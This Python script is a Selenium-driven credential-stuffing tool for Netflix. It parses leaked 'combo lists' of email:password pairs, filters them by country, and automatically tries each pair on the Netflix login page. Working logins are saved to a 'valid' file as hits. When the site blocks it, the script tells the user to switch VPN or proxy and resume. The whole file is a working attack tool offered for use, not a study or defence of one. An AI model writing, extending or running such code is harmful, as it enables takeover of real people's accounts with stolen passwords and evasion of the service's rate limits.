import time
import requests
import os
import sys
from split_method import determine_split_method
from split_method import return_error
from pathlib import Path
from header import title
from header import user_options
from countries import find_IP
from countries import countries
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains

details = [find_IP()[0], find_IP()[1], find_IP()[2]]
current_split_method = determine_split_method()
list_without_countries = False
counter = 0
hits = 0
user =[]
passw =[]
updated_list=[]
files = []
resume_flag = False
clear_page = 0
directory = str(Path(__file__).parent)

def print_ip_and_country():
	blacklisted_split_methods = ['None',';',' |','[NETFLIX]']
	split_method_has_a_country = False
	if [item for item in blacklisted_split_methods if (current_split_method != item)]:
		if isinstance(details[2], list):
			print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching {}/{} accounts\n".format(details[0], details[1], *details[2]))
		else:
			if list_without_countries == True:
				print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching All Accounts\n".format(details[0], details[1]))
			else:
				print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))
		split_method_has_a_country = True
	else:
		print("\n\033[38;5;7mCurrent IP: {} : {} | No Countries in Combo\n".format(details[0], details[1]))
	return split_method_has_a_country
	
for file_ in os.listdir(directory):
	files.append(file_)
	
for file_ in range(len(files)):
	if 'resume' in files[file_]:
		resume_flag = True
		with open('resume','r') as resume:
			for line in resume.readlines():
				user.append(line.split(":")[0])
				passw.append(line.split(":")[1])
		break
	if file_ == len(files)-1:
		with open('netflix','r') as net:
			for line in net.readlines():
				if isinstance(details[2], list) and current_split_method != "None":
					if [country for country in details[2] if(country in line)]:
						user.append(line.split(":")[0])
						passw.append(line.split(":")[1].split(current_split_method)[0].strip())		
	
				if isinstance(details[2], list) == False:
					if details[2]in line and current_split_method != ";":
						user.append(line.split(":")[0])
						passw.append(line.split(":")[1].split(current_split_method)[0].strip())

					elif details[2] in line and current_split_method != ";":
						user.append(line.split(":")[0])
						passw.append(line.split(":")[1].split(current_split_method)[0].strip())
					
				if current_split_method == ";":
					user.append(line.split(";")[1].split(";")[0])
					passw.append(line.split(";")[2].strip())
				
				if current_split_method  == "[NETFLIX]":
					user.append(line.split(" - ")[1].split(":")[0].strip())
					passw.append(line.split(" - ")[1].split(":")[1].strip())
					
				if current_split_method == "None":
					user.append(line.split(":")[0])
					passw.append(line.split(":")[1])
				
				if current_split_method == "https":
					user.append(line.split(" | ")[1].split(":")[0])
					passw.append(line.split(" | ")[1].split(":")[1])
					
			for line in range(len(user)):	
				updated_list.append("{}:{}\n".format(user[line], passw[line]))
		net.close()

page = "https://www.netflix.com/login"
while True:
	counter =0
	title()
	print(current_split_method)
	return_split_method = print_ip_and_country()
	user_options()
	options = input("Pick an option or (q)uit: ")
	while True:
		if options == "1":
			#Account Checker
			title()
			if resume_flag == True:
				print("\033[38;5;7m\nResume file found. Resuming from given combo.")	
			print_ip_and_country()
			while counter < len(user):
				if len(user) == 0:
					print("\n\033[38;5;226mNo Accounts for current country.\n")
					break
				try:
					print("\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
					browser_options = Options()
					browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
					browser = webdriver.Chrome(options = browser_options)
					browser.set_window_size(500,700)
					browser.get(page)
					time.sleep(0.7)
					if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
						button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
						button.click()
						time.sleep(0.7)
					if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
						if browser.find_element(By.XPATH,
												'//button[@data-uia="login-toggle-button"]').text == "Use password":
							button = browser.find_element(By.XPATH,
														  '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
							button.click()
					time.sleep(0.7)
					login = browser.find_element(By.XPATH, '//input[@type="email"]')
					password = browser.find_element(By.XPATH, '//input[@type="password"]')
					login.send_keys(user[counter])
					time.sleep(0.7)
					password.send_keys(passw[counter].strip())
					time.sleep(0.7)
					action = ActionChains(browser)
					password.send_keys(Keys.TAB)
					password.send_keys(Keys.ENTER)
					time.sleep(3)
					if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@role="alert"]'):
						print("\033[38;5;196m Invalid Account",end='')
					if browser.find_element(By.XPATH, '//div[@class="profiles-gate-container"]'):
						print("\033[38;5;46m Valid Account - Stored",end='')
						hits += 1
						with open('valid','a') as valid:
							valid.write("{}:{}\n".format(user[counter],passw[counter]))
				except:
					request = requests.get(page)
					if request.status_code == 403:
						print(
							"\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
						with open('resume', 'a') as resume:
							for line in range(len(updated_list)):
								resume.write("{}\n".format(updated_list[line].strip()))
						resume.close()
						exit()
				if len(updated_list) > 1:
					del updated_list[0]
				if clear_page > 10:
					title()
					print_ip_and_country()
					clear_page = 0
				time.sleep(1)
				counter += 1
				clear_page += 1
				browser.close()
				sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8"%(hits, str(counter), str(len(user))))
				sys.stdout.flush()


			print("\n\033[38;5;226mAll done.")
			input("\n\033[38;5;226mPress Enter.")
			
			if resume_flag == True:
				os.remove('resume')
			break
			
		if options == "2":		
			#Countries List in File and Stats
			if return_split_method:
				title()
				combolist_countries = {}
				key_words = ["Country: ", "Country = "]
				counter = 0
				lines_counter = 0
				recurrence = 1
				percentages = {}
				combo_file = open('netflix','r')
				combo_lines = combo_file.readlines()
				full_countries_list_from_dict = list(countries)
				while counter < len(full_countries_list_from_dict):
					while lines_counter < len(combo_lines):
						# here comes cancer
						if full_countries_list_from_dict[counter] == 'UK':
								special_countries = ['UK','GB']
								if [country for country in special_countries if(country in combo_lines[lines_counter])]:
									combolist_countries.update({full_countries_list_from_dict[counter]:recurrence})
									recurrence += 1
								lines_counter += 1
						if [key_word+countries[full_countries_list_from_dict[counter]] for key_word in key_words if(key_word+countries[full_countries_list_from_dict[counter]] in combo_lines[lines_counter])]:
							combolist_countries.update({full_countries_list_from_dict[counter]:recurrence})
							recurrence += 1
						lines_counter += 1
					recurrence = 1
					lines_counter = 0
					counter += 1
				print("\033[38;5;7m\nCurrent Combo-list contains accounts created in the following countries:")
				print("--------------------------------------------\n")
				for country in combolist_countries:
					print("\033[38;5;220m{}: \033[38;5;190m{} Accounts in List".format(country.replace("_"," "), combolist_countries[country]))
					percentages.update({country.replace("_"," "):round(combolist_countries[country] / len(combo_lines) * 100, 2)})
				print("\033[38;5;7m\nMore Stats:")
				print("--------------------------------------------\n")
				print("\033[38;5;220mTotal Combos: \033[38;5;190m{}".format(len(combo_lines)))
				if len(combolist_countries.values()) == 0 :
					print("\033[38;5;220mNo Countries in list.")
					print("\nPress enter.")
					input()
					break
				else:
					print("\033[38;5;220mMost Represented Country in List: \033[38;5;190m{}".format(list(combolist_countries.keys())
		  [list(combolist_countries.values()).index(max(combolist_countries.values()))]))
					print("\033[38;5;220mCountries Percentages: ",end='')
					for value in percentages:
						print("\n\033[38;5;190m{}: {}%".format(value, percentages[value]), end='')
					input("\n\n\033[38;5;7mPress Enter to return")
					break
			else:
				title()
				input("\033[38;5;7m\n\nNo countries to sort. \nPress Enter to return")
				break
				
		if options == "3":
			
			whitelist = ['None','[NETFLIX]', 'Short_line', ' |']
			title()
			try:
				if [item for item in whitelist if (current_split_method == item)]:
					user = []
					passw = []
					with open('netflix','r') as net:
						for line in net.readlines():
							user.append(line.split(":")[0])
							passw.append(line.split(":")[1].split(" ")[0])
					print(current_split_method)
					current_split_method = "None"
					print("\n\033[38;5;7mCountries in combos were deleted.\nYou can now check accounts without any specific VPN.")
				else:
					print("\n\033[38;5;7mThere are no countries included in given combo-list")
				list_without_countries = True
				input("\nPress Enter to Return.")
			except IndexError:
				return_error()
				
		if options == "q":
		
			#Exit
			exit()
		else:
			break
